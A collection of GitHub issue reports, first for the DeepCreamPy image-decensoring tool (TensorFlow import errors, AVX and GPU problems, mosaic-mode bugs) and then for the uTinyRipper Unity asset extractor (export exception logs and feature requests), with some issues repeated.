ion)
  File "C:\Users\HI\Anaconda3\lib\imp.py", line 243, in load_module
    return load_dynamic(name, filename, file)
  File "C:\Users\HI\Anaconda3\lib\imp.py", line 343, in load_dynamic
    return _load(spec)
ImportError: DLL load failed: A dynamic link library (DLL) initialization routin
e failed.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "C:\Users\HI\Anaconda3\lib\site-packages\tensorflow\__init__.py", line 24
, in <module>
    from tensorflow.python import pywrap_tensorflow  # pylint: disable=unused-im
port
  File "C:\Users\HI\Anaconda3\lib\site-packages\tensorflow\python\__init__.py",
line 49, in <module>
    from tensorflow.python import pywrap_tensorflow
  File "C:\Users\HI\Anaconda3\lib\site-packages\tensorflow\python\pywrap_tensorf
low.py", line 74, in <module>
    raise ImportError(msg)
ImportError: Traceback (most recent call last):
  File "C:\Users\HI\Anaconda3\lib\site-packages\tensorflow\python\pywrap_tensorf
low.py", line 58, in <module>
    from tensorflow.python.pywrap_tensorflow_internal import *
  File "C:\Users\HI\Anaconda3\lib\site-packages\tensorflow\python\pywrap_tensorf
low_internal.py", line 28, in <module>
    _pywrap_tensorflow_internal = swig_import_helper()
  File "C:\Users\HI\Anaconda3\lib\site-packages\tensorflow\python\pywrap_tensorf
low_internal.py", line 24, in swig_import_helper
    _mod = imp.load_module('_pywrap_tensorflow_internal', fp, pathname, descript
ion)
  File "C:\Users\HI\Anaconda3\lib\imp.py", line 243, in load_module
    return load_dynamic(name, filename, file)
  File "C:\Users\HI\Anaconda3\lib\imp.py", line 343, in load_dynamic
    return _load(spec)
ImportError: DLL load failed: A dynamic link library (DLL) initialization routin
e failed.


Failed to load the native TensorFlow runtime.

See https://www.tensorflow.org/install/errors

for some common reasons and solutions.  Include the entire stack trace
above this error message when asking for help.
>>>
 Can not run the program. Because my computer does not support AVX (inte (R) Atom). Write detailed instructions on how to run the program on my computer. Or shoot a video how to do it. Sorry, I translate everything from Russian into English so it becomes more difficult to understand. **DO NOT POST ADULT CONTENT**

**Describe the bug**
```
Using TensorFlow backend.
2019-05-18 20:02:08.448027: I T:\src\github\tensorflow\tensorflow\core\platform\cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2
--------------------------------------------------------------------------
Decensoring the image ./decensor_input/cdae9d54ec678379c683f6a11d82bdae.png
Traceback (most recent call last):
  File "decensor.py", line 199, in <module>
  File "decensor.py", line 51, in decensor_all_images_in_folder
  File "site-packages\PIL\Image.py", line 2657, in open
OSError: cannot identify image file './decensor_input/cdae9d54ec678379c683f6a11d82bdae.png'
[12132] Failed to execute script decensor
```

**To Reproduce**
Running it as normal with files in the input folder

**Expected behavior**
decensoring.

**Installation method**
Binary

**Desktop (please complete the following information):**
 - OS: Windows 10 Educator
 - Version [e.g. 22] 1.3.0-Beta
 - Supports AVX? Yes
 ![image](https://user-images.githubusercontent.com/46211295/58756608-ea8e5480-84c9-11e9-941d-39aced047bc0.png)
Nothing came out of the output, why is that? **DO NOT POST ADULT CONTENT**

**Describe the bug**
```
Using TensorFlow backend.
2019-05-18 20:02:08.448027: I T:\src\github\tensorflow\tensorflow\core\platform\cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2
--------------------------------------------------------------------------
Decensoring the image ./decensor_input/cdae9d54ec678379c683f6a11d82bdae.png
Traceback (most recent call last):
  File "decensor.py", line 199, in <module>
  File "decensor.py", line 51, in decensor_all_images_in_folder
  File "site-packages\PIL\Image.py", line 2657, in open
OSError: cannot identify image file './decensor_input/cdae9d54ec678379c683f6a11d82bdae.png'
[12132] Failed to execute script decensor
```

**To Reproduce**
Running it as normal with files in the input folder

**Expected behavior**
decensoring.

**Installation method**
Binary

**Desktop (please complete the following information):**
 - OS: Windows 10 Educator
 - Version [e.g. 22] 1.3.0-Beta
 - Supports AVX? Yes
 Depending on how blocky/pixelated/jagged a mosaic censor is, occasionally, the output of DeepCreamPy can also be similarly blocky/pixelated/jagged, revealing its nature as an algorithm.

However, you can mitigate the issue somewhat - the solution is to basically use the output of initial runs (as the "originals") to smooth and refine later runs of the same image. Doing this progressively smoothens out the decensor, and in turn, makes it look more like a natural part of the image as opposed to something that got decensored by DeepCreamPy.

There is a finite limit to this "artificial smoothing" of course, since eventually you will oversmooth it - 2-3 runs seems about optimal for a heavily-censored image. Of course, maybe better still would be with it being able to deal with heavily pixelated censors better in the first place, especially since oversmoothing causes other notable problems (mainly in the immediate pixels immediately surrounding the censored area).

The image set I'm trying this with has actually some fairly strong censorship - generally speaking, it's censored into 8x8 pixel squares, almost destroying the resolution (source image is 1600x1200) and details except in a rather vague sense, though the author saw fit to at least define edges to a somewhat looser extent (they still fit the overall "grid" pattern, but aren't perfect 8x8 squares). Given the heavy-handedness of the censoring, DeepCreamPy actually does a pretty admirable job, but this is definitely worse than many foes it will face, and it's visibly "different enough" from the rest of the image that the results aren't really acceptable for production-level use. DeepCreamPy certainly doesn't get much resolution data to go off of.

If need be, I can send some sample images (via private means, of course) to better train it on.  Clean installation works fine got this after installation:

`pip3 install -r requirements.txt `
> Requirement already satisfied: tensorflow in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 1)) (1.13.1)
> Requirement already satisfied: absl-py in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 2)) (0.7.1)
> Requirement already satisfied: altgraph in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 3)) (0.16.1)
> Requirement already satisfied: astor in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 4)) (0.8.0)
> Requirement already satisfied: future in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 5)) (0.17.1)
> Requirement already satisfied: gast in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 6)) (0.2.2)
> Requirement already satisfied: grpcio in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 7)) (1.21.1)
> Requirement already satisfied: h5py in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 8)) (2.9.0)
> Requirement already satisfied: Keras in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 9)) (2.2.4)
> Requirement already satisfied: Keras-Applications in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 10)) (1.0.8)
> Requirement already satisfied: Keras-Preprocessing in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 11)) (1.1.0)
> Requirement already satisfied: macholib in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 12)) (1.11)
> Requirement already satisfied: Markdown in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 13)) (3.1.1)
> Requirement already satisfied: numpy in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 14)) (1.16.4)
> Requirement already satisfied: pefile in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 15)) (2019.4.18)
> Requirement already satisfied: Pillow==5.3.0 in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 16)) (5.3.0)
> Requirement already satisfied: protobuf in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 17)) (3.8.0)
> Requirement already satisfied: pywin32-ctypes in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 18)) (0.2.0)
> Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from -r requirements.txt (line 19)) (3.13)
> Requirement already satisfied: scipy in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 20)) (1.3.0)
> Requirement already satisfied: six in /usr/lib/python3/dist-packages (from -r requirements.txt (line 21)) (1.12.0)
> Requirement already satisfied: tensorboard in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 22)) (1.13.1)
> Requirement already satisfied: termcolor in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 23)) (1.1.0)
> Requirement already satisfied: Werkzeug in /home/mike/.local/lib/python3.7/site-packages (from -r requirements.txt (line 24)) (0.15.4)
> Requirement already satisfied: wheel>=0.26 in /usr/lib/python3/dist-packages (from tensorflow->-r requirements.txt (line 1)) (0.32.3)
> Requirement already satisfied: tensorflow-estimator<1.14.0rc0,>=1.13.0 in /home/mike/.local/lib/python3.7/site-packages (from tensorflow->-r requirements.txt (line 1)) (1.13.0)
> Requirement already satisfied: setuptools>=36 in /usr/lib/python3/dist-packages (from Markdown->-r requirements.txt (line 13)) (40.8.0)
> Requirement already satisfied: mock>=2.0.0 in /home/mike/.local/lib/python3.7/site-packages (from tensorflow-estimator<1.14.0rc0,>=1.13.0->tensorflow->-r requirements.txt (line 1)) (3.0.5)

My hardware specs:
`grep -m1 "model name" /proc/cpuinfo && sudo lspci -d '::0300'`
> model name      : Intel(R) Core(TM) i5-4460  CPU @ 3.20GHz
> 01:00.0 VGA compatible controller: Advanced Micro Devices, Inc. [AMD/ATI] Ellesmere [Radeon RX 470/480/570/570X/580/580X] (rev c7)

So, I've installed ROCM stack and then upgraded my tensorflow with:
` pip3 install --user tensorflow-rocm --upgrade`
Decensor script still works:
`python3 decensor.py`

> Using TensorFlow backend.
> WARNING:tensorflow:From /home/mike/.local/lib/python3.7/site-packages/tensorflow/python/framework/op_def_library.py:263: colocate_with (from tensorflow.python.framework.ops) is deprecated and will be removed in a future version.
> Instructions for updating:
> Colocations handled automatically by placer.
> 2019-06-16 17:49:50.276113: I tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.1 SSE4.2 AVX AVX2 FMA
> 2019-06-16 17:49:50.327032: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1531] Found device 0 with properties: 
> name: Ellesmere [Radeon RX 470/480/570/570X/580/580X]
> AMDGPU ISA: gfx803
> memoryClockRate (GHz) 1.29
> pciBusID 0000:01:00.0
> Total memory: 4.00GiB
> Free memory: 3.75GiB
> 2019-06-16 17:49:50.327073: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1642] Adding visible gpu devices: 0
> 2019-06-16 17:49:50.327089: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1053] Device interconnect StreamExecutor with strength 1 edge matrix:
> 2019-06-16 17:49:50.327095: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1059]      0 
> 2019-06-16 17:49:50.327109: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1072] 0:   N 
> 2019-06-16 17:49:50.327152: I tensorflow/core/common_runtime/gpu/gpu_device.cc:1189] Created TensorFlow device (/job:localhost/replica:0/task:0/device:GPU:0 with 3540 MB memory) -> physical GPU (device: 0, name: Ellesmere [Radeon RX 470/480/570/570X/580/580X], pci bus id: 0000:01:00.0)
> Decensoring the image ./decensor_input/mermaid_censored.png
> Found 17 censored regions in this image!
> 2019-06-16 17:50:04.245093: E tensorflow/core/grappler/optimizers/dependency_optimizer.cc:704] Iteration = 0, topological sort failed with message: The graph couldn't be sorted in topological order.
> 2019-06-16 17:50:04.248662: E tensorflow/core/grappler/optimizers/dependency_optimizer.cc:704] Iteration = 1, topological sort failed with message: The graph couldn't be sorted in topological order.
> 2019-06-16 17:50:04.289627: E tensorflow/core/grappler/optimizers/dependency_optimizer.cc:704] Iteration = 0, topological sort failed with message: The graph couldn't be sorted in topological order.
> 2019-06-16 17:50:04.293118: E tensorflow/core/grappler/optimizers/dependency_optimizer.cc:704] Iteration = 1, topological sort failed with message: The graph couldn't be sorted in topological order.
> 1 out of 17 regions decensored.
> 2 out of 17 regions decensored.
> 3 out of 17 regions decensored.
> 4 out of 17 regions decensored.
> 5 out of 17 regions decensored.
> 6 out of 17 regions decensored.
> 7 out of 17 regions decensored.
> 8 out of 17 regions decensored.
> 9 out of 17 regions decensored.
> 10 out of 17 regions decensored.
> 11 out of 17 regions decensored.
> 12 out of 17 regions decensored.
> 13 out of 17 regions decensored.
> 14 out of 17 regions decensored.
> 15 out of 17 regions decensored.
> 16 out of 17 regions decensored.
> 17 out of 17 regions decensored.
> Decensored image saved to ./decensor_output/mermaid_censored.png!
> Press anything to end

But the output image
![mermaid_censored_rocm](https://user-images.githubusercontent.com/43216037/59566213-9789d500-9065-11e9-923d-bce000332ee0.png)
 has blue marks, does someone get this script wotking on GPU? From what I know about discord bots, python or js is the preferred language so it wouldn't take much to port over. I know a lot of servers would instantly add this as a bot and would be extremely grateful. Using --is_mosaic=True and image with decensor area marked with green (0, 255, 0) results in yellowish tint and no other change in image pixels.

**To Reproduce**
Steps to reproduce the behavior:
1. Follow the guide and use color RGB(0, 255, 0)
2. `Run python decensor.py --is_mosaic=True`
3. Output image has yellow filter applied to working area (but nothing else appears to change)

At first I thought filter operates on different green color marker, but changing color results in `Found 0 censored regions in this image!` and it outputs original image.


**Expected behavior**
Worked fine prior to recent pull, I even had left  image  I played with before in input dirs and output changed completely.  Going to investigate which commit works.

**Installation method**
git clone

**Desktop (please complete the following information):**
 - OS: OpenSuSE 15.0 
 - Version: 7c21b666161f90a2cf5cee8a57cae3af5c4b04ee
 - Supports AVX: yes
- CPU: AMD Ryzen 7 1700 Eight-Core Processor [kyoukisu DeepCreamPy-1.3.0-beta]# python3 decensor.py 
Using TensorFlow backend.
WARNING:tensorflow:From /usr/lib/python3.7/site-packages/tensorflow/python/framework/op_def_library.py:263: colocate_with (from tensorflow.python.framework.ops) is deprecated and will be removed in a future version.
Instructions for updating:
Colocations handled automatically by placer.
2019-02-24 14:46:39.220255: I tensorflow/core/platform/profile_utils/cpu_utils.cc:94] CPU Frequency: 1796700000 Hz
2019-02-24 14:46:39.221066: I tensorflow/compiler/xla/service/service.cc:150] XLA service 0x55d64d468470 executing computations on platform Host. Devices:
2019-02-24 14:46:39.221135: I tensorflow/compiler/xla/service/service.cc:158]   StreamExecutor device (0): <undefined>, <undefined>
--------------------------------------------------------------------------
Decensoring the image ./decensor_input/mermaid_censored.png
Traceback (most recent call last):
  File "decensor.py", line 199, in <module>
    decensor.decensor_all_images_in_folder()
  File "decensor.py", line 70, in decensor_all_images_in_folder
    self.decensor_image(colored_img, colored_img, file_name)
  File "decensor.py", line 85, in decensor_image
    ori_array = image_to_array(ori)
  File "/home/kyoukisu/Downloads/DeepCreamPy-1.3.0-beta/libs/utils.py", line 7, in image_to_array
    return np.array(array / 255.0)
TypeError: unsupported operand type(s) for /: 'PngImageFile' and 'float'

 Can not run the program. Because my computer does not support AVX (inte (R) Atom). Write detailed instructions on how to run the program on my computer. Or shoot a video how to do it. Sorry, I translate everything from Russian into English so it becomes more difficult to understand. Greetings!

I'm trying to get this application to run on Ubuntu 18.04, but get this error:

> Using plaidml.keras.backend backend.
INFO:plaidml:Opening device "llvm_cpu.0"
Traceback (most recent call last):
  File "decensor.py", line 198, in <module>
    decensor = Decensor()
  File "decensor.py", line 22, in __init__
    self.load_model()
  File "decensor.py", line 31, in load_model
    self.model = PConvUnet()
  File "/mnt/volume/decensor/DeepCreamPy-1.3.0-beta/libs/pconv_hybrid_model.py", line 36, in __init__
    self.model = self.build_pconv_unet()
  File "/mnt/volume/decensor/DeepCreamPy-1.3.0-beta/libs/pconv_hybrid_model.py", line 77, in build_pconv_unet
    e_conv1, e_mask1 = encoder_layer(inputs_img, inputs_mask, 64, 7, bn=False)
  File "/mnt/volume/decensor/DeepCreamPy-1.3.0-beta/libs/pconv_hybrid_model.py", line 69, in encoder_layer
    conv, mask = PConv2D(filters, kernel_size, strides=2, padding='same')([img_in, mask_in])
  File "/mnt/volume/decensor/virtualenv/decensor/lib/python3.6/site-packages/keras/engine/base_layer.py", line 457, in __call__
    output = self.call(inputs, **kwargs)
  File "/mnt/volume/decensor/DeepCreamPy-1.3.0-beta/libs/pconv_layer.py", line 64, in call
    normalization = K.repeat_elements(normalization, inputs[1].shape[2], axis=2)
IndexError: tuple index out of range


I'm using python 3.6 and installed all requirements (plus plaidml-keras, which was missing) to a virtualenv. I also downloaded and added the model data. 
When trying to run it on the default mermaid image, I get stuck with this error message. 

Any ideas what I might do wrong? :(
Thank you very much in advance! Using --is_mosaic=True and image with decensor area marked with green (0, 255, 0) results in yellowish tint and no other change in image pixels.

**To Reproduce**
Steps to reproduce the behavior:
1. Follow the guide and use color RGB(0, 255, 0)
2. `Run python decensor.py --is_mosaic=True`
3. Output image has yellow filter applied to working area (but nothing else appears to change)

At first I thought filter operates on different green color marker, but changing color results in `Found 0 censored regions in this image!` and it outputs original image.


**Expected behavior**
Worked fine prior to recent pull, I even had left  image  I played with before in input dirs and output changed completely.  Going to investigate which commit works.

**Installation method**
git clone

**Desktop (please complete the following information):**
 - OS: OpenSuSE 15.0 
 - Version: 7c21b666161f90a2cf5cee8a57cae3af5c4b04ee
 - Supports AVX: yes
 can I Training model by myself
How can I do that 
 Trying to decensor this test picture: 
![mosaic](https://user-images.githubusercontent.com/4163254/52523152-c7445d00-2cc0-11e9-9c7a-169f70c7eb12.png)

application works correctly with green regions, but if there is no green regions and i pass flag --is_mosaic=True, app fails:

![image](https://user-images.githubusercontent.com/4163254/52523166-efcc5700-2cc0-11e9-9e91-2b2dbf11027a.png)

 Using TensorFlow backend.
2019-03-29 12:33:21.167891: I tensorflow/core/common_runtime/process_util.cc:69] Creating new thread pool with default inter op setting: 2. Tune using inter_op_parallelism_threads for best performance.
Traceback (most recent call last):
  File "decensor.py", line 212, in <module>
    decensor = Decensor()
  File "decensor.py", line 29, in __init__
    self.load_model()
  File "decensor.py", line 42, in load_model
    lr=0.00005
  File "/home/lumine/Apps/AI/DeepCreamPy-master/libs/pconv_hybrid_model.py", line 238, in load
    self.model.load_weights(filepath)        
  File "/usr/local/lib/python3.6/dist-packages/keras/engine/network.py", line 1157, in load_weights
    with h5py.File(filepath, mode='r') as f:
  File "/home/lumine/.local/lib/python3.6/site-packages/h5py/_hl/files.py", line 312, in __init__
    fid = make_fid(name, mode, userblock_size, fapl, swmr=swmr)
  File "/home/lumine/.local/lib/python3.6/site-packages/h5py/_hl/files.py", line 142, in make_fid
    fid = h5f.open(name, flags, fapl=fapl)
  File "h5py/_objects.pyx", line 54, in h5py._objects.with_phil.wrapper
  File "h5py/_objects.pyx", line 55, in h5py._objects.with_phil.wrapper
  File "h5py/h5f.pyx", line 78, in h5py.h5f.open
OSError: Unable to open file (unable to open file: name = './models/model.h5', errno = 2, error message = 'No such file or directory', flags = 0, o_flags = 0)

Then exits to bash. Every time I'm trying to decensor smth, it just won't. Well, it does some color messing with green lines, but nothing more. Here's example:
![loadout (66](https://user-images.githubusercontent.com/51263046/58747832-594fbb80-8492-11e9-8ba9-f6c524d3bfae.png)

I'm not into coding all that much (Actually at all), so I have no idea what should I do and how to fix it.  Every time I'm trying to decensor smth, it just won't. Well, it does some color messing with green lines, but nothing more. Here's example:
![loadout (66](https://user-images.githubusercontent.com/51263046/58747832-594fbb80-8492-11e9-8ba9-f6c524d3bfae.png)

I'm not into coding all that much (Actually at all), so I have no idea what should I do and how to fix it.  How many pictures used in training? How many pictures used in training?
<---------->
121145608
Are there any way to recovering shader, i''ve just seen new devx ver 9.x, they could recovering shaders, even to shader graph, I dont know this is able or not, but this feature will be an awesome feature.

![02](https://user-images.githubusercontent.com/51503947/66734471-6becef00-ee8d-11e9-89d5-14c50e170272.png)

The screenshot from demo clip of their software. Output log:
Import: Game file 'level10' has been found
Import: Dependency 'unity_builtin_extra' has been loaded
Import: Dependency 'unity default resources' has been loaded
Import: Dependency 'globalgamemanagers.assets' has been loaded
Import: Dependency 'sharedassets0.assets' has been loaded
Import: Dependency 'resources.assets' has been loaded
Import: Dependency 'sharedassets5.assets' has been loaded
Import: Dependency 'sharedassets1.assets' has been loaded
Import: Dependency 'sharedassets6.assets' has been loaded
Import: Dependency 'sharedassets7.assets' has been loaded
Import: Dependency 'sharedassets9.assets' has been loaded
Import: Dependency 'sharedassets10.assets' has been loaded
Import: Asset collection has versions probably incompatible with each other. Here they are:
Import: 2017.4.6f1
Import: 2017.3.0b10
Import: System.ArgumentException: Illegal characters in path.
   at System.IO.Path.CheckInvalidPathChars(String path, Boolean checkAdditional)
   at System.Security.Permissions.FileIOPermission.CheckIllegalCharacters(String[] str)
   at System.Security.Permissions.FileIOPermission.AddPathList(FileIOPermissionAccess access, AccessControlActions control, String[] pathListOrig, Boolean checkForDuplicates, Boolean needFullPath, Boolean copyPathList)
   at System.Security.Permissions.FileIOPermission..ctor(FileIOPermissionAccess access, String[] pathList, Boolean checkForDuplicates, Boolean needFullPath)
   at System.IO.DirectoryInfo.Init(String path, Boolean checkHost)
   at System.IO.DirectoryInfo..ctor(String path)
   at uTinyRipper.FileUtils.GetUniqueName(String dirPath, String fileName)
   at uTinyRipper.AssetExporters.ExportCollection.GetUniqueFileName(ISerializedFile file, Object asset, String dirPath)
   at uTinyRipper.AssetExporters.AssetExportCollection.Export(ProjectAssetContainer container, String dirPath)
   at uTinyRipper.AssetExporters.ProjectExporter.Export(String path, FileCollection fileCollection, IEnumerable`1 assets, ExportOptions options)
   at uTinyRipper.GameStructure.Export(String exportPath, Func`2 filter)
   at uTinyRipperGUI.MainWindow.ExportFiles(Object data)
Go to: Create issue

 Here is the out log.
```
Output log:
Import: Game file 'level0' has been found
Import: SerializedFileException: v:2017.1.1f1 n:unity builtin extra p:C:\Program Files (x86)\Steam\steamapps\common\VTOL VR\VTOLVR_Data\Resources\unity_builtin_extra
Message: Error during reading asset type Shader
Inner: System.Exception: Unupported parameter type 4
   at uTinyRipper.Classes.Shaders.ShaderSubProgram.Read(AssetReader reader)
   at uTinyRipper.Classes.Shaders.ShaderSubProgramBlob.Read(AssetReader reader)
   at uTinyRipper.Classes.Shader.Read(AssetReader reader)
   at uTinyRipper.SerializedFiles.SerializedFile.ReadAsset(AssetReader reader, AssetInfo assetInfo, Int64 offset, Int32 size)
StackTrace:    at uTinyRipper.SerializedFiles.SerializedFile.ReadAsset(AssetReader reader, AssetInfo assetInfo, Int64 offset, Int32 size)
   at uTinyRipper.SerializedFiles.SerializedFile.ReadAsset(AssetReader reader, AssetEntry info)
   at uTinyRipper.SerializedFiles.SerializedFile.ReadAssets(EndianReader reader)
   at uTinyRipper.SerializedFiles.SerializedFileScheme.ReadFile(IFileCollection collection, IAssemblyManager manager)
   at uTinyRipper.FileList.AddFile(FileScheme scheme, IFileCollection collection, IAssemblyManager manager)
   at uTinyRipper.GameStructure.Processor.ProcessFile(String fileName, String filePath)
   at uTinyRipper.GameStructure.Processor.LoadDependencies(FileScheme scheme)
   at uTinyRipper.GameStructure.Processor.ProcessFile(String fileName, String filePath)
   at uTinyRipper.GameStructure.Processor.LoadDependencies(FileScheme scheme)
   at uTinyRipper.GameStructure.Processor.ProcessFile(String fileName, String filePath)
   at uTinyRipper.GameStructure.ProcessGameStructure(Processor processor, PlatformGameStructure structure)
   at uTinyRipper.GameStructure.Load(List`1 pathes)
   at uTinyRipper.GameStructure.Load(IEnumerable`1 pathes)
   at uTinyRipperGUI.MainWindow.LoadFiles(Object data)
```


[Data Files](https://drive.google.com/file/d/1T066icJqsZ7NO8jEhlQysOzC5A3Pp0GI/view?usp=sharing)
 Output log:
Import: Game file 'level2' has been found
Import: Asset collection has versions probably incompatible with each other. Here they are:
Import: 5.5.1f1
Import: 5.5.0f2
Import: System.NullReferenceException: Object reference not set to an instance of an object.
   at uTinyRipper.AssetExporters.ProjectAssetContainer.GetResourcePathFromAssets(IEnumerable`1 assets, String filePath, String& resourcePath)
   at uTinyRipper.AssetExporters.AssetExportCollection.Export(ProjectAssetContainer container, String dirPath)
   at uTinyRipper.AssetExporters.ProjectExporter.Export(String path, FileCollection fileCollection, IEnumerable`1 assets, ExportOptions options)
   at uTinyRipper.GameStructure.Export(String exportPath, Func`2 filter)
   at uTinyRipperGUI.MainWindow.ExportFiles(Object data) Import: Dependency 'library/unity default resources' hasn't been found
Import: System.ArgumentException: Caracteres inválidos no caminho.
   em System.Security.Permissions.FileIOPermission.EmulateFileIOPermissionChecks(String fullPath)
   em System.IO.DirectoryInfo.Init(String path, Boolean checkHost)
   em uTinyRipper.FileUtils.GetUniqueName(String dirPath, String fileName, Int32 maxNameLength)
   em uTinyRipper.AssetExporters.ExportCollection.GetUniqueFileName(ISerializedFile file, Object asset, String dirPath)
   em uTinyRipper.AssetExporters.AssetExportCollection.Export(ProjectAssetContainer container, String dirPath)
   em uTinyRipper.AssetExporters.ProjectExporter.Export(String path, FileCollection fileCollection, IEnumerable`1 assets, ExportOptions options)
   em uTinyRipper.GameStructure.Export(String exportPath, Func`2 filter)
   em uTinyRipperGUI.MainWindow.ExportFiles(Object data) Output log:
Import: Asset bundle 'data.unity3d' has been found
Import: Asset bundle 'data' has been found
Import: PC game structure has been found at '.......\FolderPAth'
Import: Assembly 'UnityEngine' has been loaded
Import: Assembly 'Assembly-CSharp-Editor' hasn't been found
Import: Assembly 'Assembly-CSharp' has been loaded
Import: Assembly 'UnityEngine.CoreModule' has been loaded
Import: Assembly 'mscorlib' has been loaded
Import: Assembly 'UnityEngine.AnimationModule' has been loaded
Import: Assembly 'UnityEngine.AudioModule' has been loaded
Import: Assembly 'UnityEngine.TextRenderingModule' has been loaded
Import: Assembly 'UnityEngine.ParticleSystemModule' has been loaded
Import: Assembly 'System.Core' has been loaded
Import: Assembly 'UnityEngine.PhysicsModule' has been loaded
Import: Assembly 'Sirenix.Serialization' has been loaded
Import: Assembly 'Sirenix.Serialization.Config' has been loaded
Import: Assembly 'HOTween' has been loaded
Import: Assembly 'Assembly-CSharp-firstpass' has been loaded
Import: Assembly 'Facebook.Unity.Settings' has been loaded
Import: Assembly 'Sirenix.Utilities' has been loaded
Import: Assembly 'UnityEngine.UI' has been loaded
Import: Assembly 'UnityEngine.UIModule' has been loaded
Import: System.ArgumentException: SerializedFile with name 'globalgamemanagers' already presents in the collection
Parameter name: file
   at uTinyRipper.FileCollection.OnSerializedFileAdded(SerializedFile file)
   at uTinyRipper.FileCollection.OnFileListAdded(FileList list)
   at uTinyRipper.FileList.AddFile(FileScheme scheme, IFileCollection collection, IAssemblyManager manager)
   at uTinyRipper.GameStructure.Processor.ProcessFile(String fileName, String filePath)
   at uTinyRipper.GameStructure.ProcessGameStructure(Processor processor, PlatformGameStructure structure)
   at uTinyRipper.GameStructure.Load(List`1 pathes)
   at uTinyRipper.GameStructure.Load(IEnumerable`1 pathes)
   at uTinyRipperGUI.MainWindow.LoadFiles(Object data) Data folder: https://drive.google.com/open?id=1qhGynB2kg7KFRqejrpT0jFzJBa3IEbER Yes, im finally back.

```
Import: System.ArgumentOutOfRangeException: Index was out of range. Must be non-negative and less than the size of the collection.
Parameter name: index
   at System.ThrowHelper.ThrowArgumentOutOfRangeException(ExceptionArgument argument, ExceptionResource resource)
   at System.SZArrayHelper.get_Item[T](Int32 index)
   at uTinyRipper.AssetExporters.ProjectAssetContainer.TagIDToName(Int32 tagID)
   at uTinyRipper.Classes.GameObject.ExportYAMLRoot(IExportContainer container)
   at uTinyRipper.Classes.Object.ExportYAMLDocument(IExportContainer container)
   at uTinyRipper.AssetExporters.YAMLAssetExporter.Export(IExportContainer container, IEnumerable`1 assets, String path)
   at uTinyRipper.AssetExporters.AssetExportCollection.Export(ProjectAssetContainer container, String dirPath)
   at uTinyRipper.AssetExporters.ProjectExporter.Export(String path, FileCollection fileCollection, IEnumerable`1 assets, ExportOptions options)
   at uTinyRipper.GameStructure.Export(String exportPath, Func`2 filter)
   at uTinyRipperGUI.MainWindow.ExportFiles(Object data)
```
idk what causes this.  Will we be able in the future to extract Post Processing Stack Profiles, just Profiles. 
Import: System.ArgumentException: The path contains invalid characters.
in System.IO.Path.CheckInvalidPathChars(String path, Boolean checkAdditional)
   in System.Security.Permissions.FileIOPermission.AddPathList(FileIOPermissionAccess access, AccessControlActions control, String[] pathListOrig, Boolean checkForDuplicates, Boolean needFullPath, Boolean copyPathList)
   in System.Security.Permissions.FileIOPermission.AddPathList(FileIOPermissionAccess access, String[] pathListOrig, Boolean checkForDuplicates, Boolean needFullPath, Boolean copyPathList)
   in System.Security.Permissions.FileIOPermission..ctor(FileIOPermissionAccess access, String[] pathList, Boolean checkForDuplicates, Boolean needFullPath)
   in System.IO.DirectoryInfo.Init(String path, Boolean checkHost)
   in uTinyRipper.FileUtils.GetUniqueName(String dirPath, String fileName, Int32 maxNameLength)
   in uTinyRipper.AssetExporters.AssetExportCollection.Export(ProjectAssetContainer container, String dirPath)
   in uTinyRipper.AssetExporters.ProjectExporter.Export(String path, FileCollection fileCollection, IEnumerable`1 assets, ExportOptions options)
   in uTinyRipper.GameStructure.Export(String exportPath, Func`2 filter)
   in uTinyRipperGUI.MainWindow.ExportFiles(Object data) Heya, I've been bumping into this error on a few files, thanks for taking a look,

>Import: Asset collection has versions probably incompatible with each other. Here they are:
Import: 4.6.4p4
Import: 4.7.2f1

>Import: System.Exception: There is no curve with index 0 in any of previous frames
   at uTinyRipper.Classes.AnimationClips.AnimationClipConverter.GetPreviousFrame(IReadOnlyList`1 streamFrames, Int32 curveID, Int32 currentFrame, Int32& frameIndex, Int32& curveIndex)
   at uTinyRipper.Classes.AnimationClips.AnimationClipConverter.ProcessStreams(IReadOnlyList`1 streamFrames, AnimationClipBindingConstant bindings, IReadOnlyDictionary`2 tos, Single sampleRate)
   at uTinyRipper.Classes.AnimationClips.AnimationClipConverter.ProcessInner()
   at uTinyRipper.Classes.AnimationClip.ExportGenericData()
   at uTinyRipper.Classes.AnimationClip.GetAnimationCurves(Version version, TransferInstructionFlags flags)
   at uTinyRipper.Classes.AnimationClip.ExportYAMLRoot(IExportContainer container)
   at uTinyRipper.Classes.Object.ExportYAMLDocument(IExportContainer container)
   at uTinyRipper.AssetExporters.YAMLAssetExporter.Export(IExportContainer container, Object asset, String path)
   at uTinyRipper.AssetExporters.AssetExportCollection.Export(ProjectAssetContainer container, String dirPath)
